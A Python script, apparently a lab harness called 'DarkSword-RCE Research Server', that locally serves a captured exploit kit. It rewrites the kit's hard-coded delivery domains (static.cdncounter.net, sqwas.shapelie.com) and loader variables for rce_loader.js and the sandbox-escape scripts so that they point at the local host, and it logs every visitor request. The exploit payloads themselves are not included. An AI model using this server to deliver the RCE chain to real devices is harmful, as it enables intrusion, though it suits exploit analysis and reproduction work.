import os
import re
import io
import urllib.parse
import http.server
import socketserver
from datetime import datetime
from pathlib import Path

# ─── Config ───────────────────────────────────────────────
BASE_DIR  = Path(__file__).parent.resolve()
LOGS_DIR  = BASE_DIR / "logs"
PORT      = 8080
BIND      = "0.0.0.0"
LOCAL_IP  = ""   # auto-detected at startup

# ─── Dynamic Patches ──────────────────────────────────────
DYNAMIC_PATCHES = [

    # ── 1. rce_loader.js — localHost variable ─────────────────────────────
    (
        r'(var\s+localHost\s*=\s*)["\']https?://[^"\']*["\']',
        r'\g<1>"http://{IP}:{PORT}"',
    ),

    # ── 2. Any other top-level server-URL variable (future-proof) ─────────
    (
        r'((?:var|let|const)\s+(?:serverHost|SERVER_HOST|serverUrl|SERVER_URL)\s*=\s*)'
        r'["\']https?://[^"\']*["\']',
        r'\g<1>"http://{IP}:{PORT}"',
    ),

    # ── 3. logurlprefix bare variable declaration ──────────────────────────
    (
        r'((?:var|let|const)\s+logurlprefix\s*=\s*)["\'][^"\']*["\']',
        r'\g<1>""',
    ),

    # ── 4a. CDN origin with /assets/ prefix → local origin, strip /assets/
    (
        r'https?://static\.cdncounter\.net/assets/',
        r'http://{IP}:{PORT}/',
    ),

    # ── 4b. CDN origin (without /assets/ path, or bare domain) → local origin
    (
        r'https?://static\.cdncounter\.net(?=/|["\'\s?#]|$)',
        r'http://{IP}:{PORT}',
    ),

    # ── 4c. Any remaining hard-coded IP:port origin → local origin
    (
        r'http://(?:\d{1,3}\.){3}\d{1,3}:\d+',
        r'http://{IP}:{PORT}',
    ),

    # ── 5. sqwas.shapelie.com — bare hostname used in some build variants ──
    (
        r'sqwas\.shapelie\.com',
        r'{IP}',
    ),

    # ── 6. Hard-coded 404 redirect to original exploit domain ─────────────
    (
        r'window\.location\.href\s*=\s*["\']https://static\.cdncounter\.net/404\.html["\']',
        r'window.location.href = "https://www.google.com"',
    ),

    # ── 7. LOG() function guard — sbx0/sbx1 main scripts ─────────────────
    (
        r'function LOG\(msg\)\s*\{(?!\s*if\s*\(typeof)',
        r'function LOG(msg) { if(typeof print!=="undefined") print("sbx0: "+msg); return; ',
    ),
]

# Extensions to patch (lowercase, compared case-insensitively)
PATCH_EXTENSIONS = {".html", ".htm", ".js"}

SYMLINKS = {"rce_worker_18.4.js": "rce_worker.js"}

# ─── Helpers ──────────────────────────────────────────────
def get_local_ip():
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        try:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        except Exception:
            return "127.0.0.1"

def make_symlinks():
    for link_name, target in SYMLINKS.items():
        link = BASE_DIR / link_name
        tgt  = BASE_DIR / target
        if not link.exists() and tgt.exists():
            link.symlink_to(target)
            print(f"  [✓] Symlink: {link_name} → {target}")
        elif link.exists():
            print(f"  [~] Symlink exists: {link_name}")
        else:
            print(f"  [!] Target missing for symlink: {target}")

def apply_patches(content: str) -> "tuple[str, int]":
    """Apply all DYNAMIC_PATCHES and return (patched_content, total_substitutions)."""
    global LOCAL_IP
    total = 0
    for pat, repl in DYNAMIC_PATCHES:
        repl_str = repl.replace("{IP}", LOCAL_IP).replace("{PORT}", str(PORT))
        content, n = re.subn(pat, repl_str, content)
        total += n
    return content, total

def should_patch(path: str) -> bool:
    """Return True if the filesystem path has a patchable extension (case-insensitive)."""
    _, ext = os.path.splitext(path)          # FIX 1: use splitext, not endswith
    return ext.lower() in PATCH_EXTENSIONS   # FIX 2: case-insensitive + .htm support

# ─── Reusable TCP Server ───────────────────────────────────
class ReusableTCPServer(socketserver.TCPServer):
    allow_reuse_address = True

# ─── Logging HTTP Handler ──────────────────────────────────
class LoggingHandler(http.server.SimpleHTTPRequestHandler):
    log_file = None

    def send_head(self):
        """Intercept GET/HEAD requests to dynamically patch text files."""
        path = self.translate_path(self.path)

        # ── Directory handling ────────────────────────────────────────────
        if os.path.isdir(path):
            parts = urllib.parse.urlsplit(self.path)
            if not parts.path.endswith("/"):
                # Redirect to trailing-slash URL
                self.send_response(301)
                self.send_header("Location", self.path + "/")
                self.send_header("Content-Length", "0")
                self.end_headers()
                return None

            # Look for an index file; update path if found
            resolved = None
            for index in ("index.html", "index.htm"):
                candidate = os.path.join(path, index)
                if os.path.exists(candidate):
                    resolved = candidate
                    break

            if resolved is None:
                # No index — fall back to parent (directory listing)
                return super().send_head()

            path = resolved   # FIX 3: carry resolved index path forward

        # ── Non-patchable files → delegate to parent ──────────────────────
        if not should_patch(path):              # FIX 1+2 applied here
            return super().send_head()

        # ── Patchable file: open, patch, serve from memory ────────────────
        if not os.path.isfile(path):
            self.send_error(404, "File not found")
            return None

        try:
            with open(path, "rb") as fd:
                raw = fd.read()
        except OSError as exc:
            self.send_error(404, f"File not found: {exc}")
            return None

        try:
            content = raw.decode("utf-8", errors="replace")
            patched, n_subs = apply_patches(content)

            if n_subs:
                print(f"  [patch] {os.path.basename(path)}: {n_subs} substitution(s) applied")
            else:
                print(f"  [serve] {os.path.basename(path)}: no patterns matched (served as-is)")

            body = patched.encode("utf-8")
        except Exception as exc:                # FIX 4: keep error BEFORE headers are sent
            print(f"\n[!] Patch error for {path}: {exc}")
            self.send_error(500, "Internal patch error")
            return None

        # All preparation succeeded — now commit to sending the response
        f = io.BytesIO(body)
        self.send_response(200)
        self.send_header("Content-Type",   self.guess_type(path))
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Last-Modified",  self.date_time_string())
        self.end_headers()
        return f

    def handle(self):
        try:
            super().handle()
        except (BrokenPipeError, ConnectionResetError):
            pass

    def log_message(self, fmt, *args):
        raw     = fmt % args
        line    = f"{self.client_address[0]} - [{self.log_date_time_string()}] {raw}\n"
        decoded = urllib.parse.unquote(line)
        print(decoded, end="", flush=True)
        if LoggingHandler.log_file:
            LoggingHandler.log_file.write(decoded)
            LoggingHandler.log_file.flush()

    def end_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store")
        super().end_headers()

# ─── Main ──────────────────────────────────────────────────
def main():
    global LOCAL_IP
    LOCAL_IP = get_local_ip()

    print("=" * 55)
    print("  DarkSword-RCE Research Server")
    print("=" * 55)
    print(f"  Base dir : {BASE_DIR}")
    print(f"  Local IP : {LOCAL_IP}")
    print(f"  Port     : {PORT}")
    print()

    # 1) Logs
    LOGS_DIR.mkdir(exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_path = LOGS_DIR / f"exploit_{ts}.log"
    LoggingHandler.log_file = open(log_path, "a")
    print(f"  [*] Logging to: {log_path}")
    print()

    # 2) Patch summary
    print(f"  [*] Dynamic patching active ({len(DYNAMIC_PATCHES)} rules)")
    print( "      Patches target named JS variables/fields — IP-agnostic.")
    print(f"      Patched extensions: {', '.join(sorted(PATCH_EXTENSIONS))}")
    print()

    # 3) Symlinks
    print("  [*] Creating symlinks ...")
    make_symlinks()
    print()

    # 4) Serve
    os.chdir(BASE_DIR)
    print(f"  [*] Starting HTTP server → http://{LOCAL_IP}:{PORT}/frame.html")
    print("      Press Ctrl+C to stop.\n")

    with ReusableTCPServer((BIND, PORT), LoggingHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n  [*] Server stopped.")
            LoggingHandler.log_file.close()

if __name__ == "__main__":
    main()